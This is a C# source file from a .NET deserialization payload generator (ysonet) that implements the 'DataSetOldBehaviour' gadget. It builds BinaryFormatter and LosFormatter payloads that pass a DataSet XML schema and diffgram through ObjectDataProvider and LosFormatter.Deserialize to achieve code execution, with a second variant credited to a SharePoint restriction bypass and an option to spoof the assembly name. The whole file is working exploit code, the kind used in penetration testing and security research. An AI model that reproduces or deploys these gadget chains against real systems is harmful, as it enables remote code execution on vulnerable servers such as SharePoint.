using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    internal class DataSetOldBehaviourGenerator : GenericGenerator
    {
        private int variant_number = 1; // Add variant support
        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        
        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib')", v => spoofedAssembly = v },
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2", v => int.TryParse(v, out this.variant_number) },
            };

            return options;
        }

        public override string AdditionalInfo()
        {
            /*
                The DataSetOldBehaviour and DataSetOldBehaviourFromFile gadgets are based on three ideas:
                1- Steven Seeley's research documented at https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
                
                2- Concept of converting BinaryFromatter to JSON by Soroush Dalili for further manipulation and pruning
                
                3- Markus Wulftange's idea of loading assembly byte code to bypass restrictions we currently have for ActivitySurrogateSelector

                4- The variant 2 in the gadget comes from https://blog.viettelcybersecurity.com/sharepoint-toolshell/ where Khoa Dinh used an array to bypass the restrictions in SharePoint
                
                This gadget targets an old behavior of DataSet which uses XML format (https://github.com/microsoft/referencesource/blob/dae14279dd0672adead5de00ac8f117dcf74c184/System.Data/System/Data/DataSet.cs#L323) which is different than what was found in the DataSet gadget by James Forshaw
                
                
             */
            var info = @"This gadget targets an old behavior of DataSet which uses XML format";

            return info;
        }

        public override string Name()
        {
            return "DataSetOldBehaviour";
        }

        public override string Finders()
        {
            return "Steven Seeley, Markus Wulftange, Khoa Dinh";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "LosFormatter" }; // SoapFormatter for the curious?
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.LosFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] losFormatterPayload;
            if (BridgedPayload != null)
            {
                losFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                losFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("LosFormatter", inputArgs);
            }

            // Define XML schemas and deserializer callers based on variant
            string xmlSchema;
            string xmlLosFormatterDeserializeCaller;

            if (variant_number == 2)
            {
                // Variant 2: Alternative XML schema and deserializer caller
                xmlSchema = @"<?xml version=""1.0"" encoding=""utf-16""?>
<xs:schema xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
    <xs:element name=""ds"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
        <xs:complexType>
            <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
                <xs:element name=""tbl"">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name=""objwrapper"" msdata:DataType=""System.Collections.Generic.List`1[[System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"" type=""xs:anyType"" minOccurs=""0""/>
                        </xs:sequence>
                    </xs:complexType>
                </xs:element>
            </xs:choice>
        </xs:complexType>
    </xs:element>
</xs:schema>
";

                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
        <ds>
            <tbl diffgr:id=""Table"" msdata:rowOrder=""0"" >
                <objwrapper xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
                    <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
                        <ExpandedElement/>
                        <ProjectedProperty0>
                            <MethodName>Deserialize</MethodName>
                            <MethodParameters>
                                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">%LosFromatterPayload%</anyType>
                            </MethodParameters>
                            <ObjectInstance xsi:type=""LosFormatter""/>
                        </ProjectedProperty0>
                    </ExpandedWrapperOfLosFormatterObjectDataProvider>
                </objwrapper>
            </tbl>
        </ds>
    </diffgr:diffgram>
";
            }
            else
            {
                // Variant 1: Default XML schema and deserializer caller
                xmlSchema = @"<?xml version=""1.0"" encoding=""utf-16""?>
<xs:schema
    id=""ds""
    xmlns=""""
    xmlns:xs=""http://www.w3.org/2001/XMLSchema""
    xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
  <xs:element name=""ds"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
    <xs:complexType>
      <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
        <xs:element name=""tbl"">
          <xs:complexType>
            <xs:sequence>
              <xs:element
                  name=""objwrapper""
                  msdata:DataType=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""
                  type=""xs:anyType""
                  msdata:targetNamespace=""""
                  minOccurs=""0"" />
            </xs:sequence>
          </xs:complexType>
        </xs:element>
      </xs:choice>
    </xs:complexType>
  </xs:element>
</xs:schema>
";

                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram
    xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata""
    xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">

  <ds>
    <tbl diffgr:id=""tbl1"" msdata:rowOrder=""0"">
      <objwrapper
          xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
          xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">

        <ExpandedElement/>

        <ProjectedProperty0>
          <ObjectInstance xsi:type=""LosFormatter""/>
          <MethodName>Deserialize</MethodName>
          <MethodParameters>
            <anyType xsi:type=""xsd:string"">%LosFromatterPayload%</anyType>
          </MethodParameters>
        </ProjectedProperty0>

      </objwrapper>
    </tbl>
  </ds>

</diffgr:diffgram>
";
            }

            if (inputArgs.Minify)
            {
                if (inputArgs.UseSimpleType)
                {
                    xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                }
                else
                {
                    xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                }
            }

            xmlSchema = CommandArgSplitter.JsonStringEscape(xmlSchema);
            xmlLosFormatterDeserializeCaller = CommandArgSplitter.JsonStringEscape(xmlLosFormatterDeserializeCaller);

            var losFormatterPayloadString = Encoding.UTF8.GetString(losFormatterPayload);

            xmlLosFormatterDeserializeCaller = xmlLosFormatterDeserializeCaller.Replace("%LosFromatterPayload%", losFormatterPayloadString);

            

            var bf_json = @"[{""Id"": 1,
    ""Data"": {
      ""$type"": ""SerializationHeaderRecord"",
      ""binaryFormatterMajorVersion"": 1,
      ""binaryFormatterMinorVersion"": 0,
      ""binaryHeaderEnum"": 0,
      ""topId"": 1,
      ""headerId"": -1,
      ""majorVersion"": 1,
      ""minorVersion"": 0
}},{""Id"": 2,
    ""TypeName"": ""Assembly"",
    ""Data"": {
      ""$type"": ""BinaryAssembly"",
      ""assemId"": 2,
      ""assemblyString"": ""%SPOOFED%""
}},{""Id"": 3,
    ""TypeName"": ""ObjectWithMapTypedAssemId"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 5,
      ""objectId"": 1,
      ""name"": ""System.Data.DataSet,System.Data"",
      ""numMembers"": 2,
      ""memberNames"":[""XmlSchema"",""XmlDiffGram""],
      ""binaryTypeEnumA"":[1,1],
      ""typeInformationA"":[null,null],
      ""typeInformationB"":[null,null],
      ""memberAssemIds"":[0,0],
      ""assemId"": 2
}},{""Id"": 5,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 4,
      ""value"": """ + xmlSchema + @"""
}},{""Id"": 6,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 5,
      ""value"": """ + xmlLosFormatterDeserializeCaller+ @"""
}},{""Id"": 12,
    ""TypeName"": ""MessageEnd"",
    ""Data"": {
      ""$type"": ""MessageEnd""
}}]";

            bf_json = bf_json.Replace("%SPOOFED%", spoofedAssembly);

            MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(bf_json);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
            {
                //BinaryFormatter
                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_bf.ToArray();
            }
            else if(formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                // LosFormatter
                MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_lf.ToArray();
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
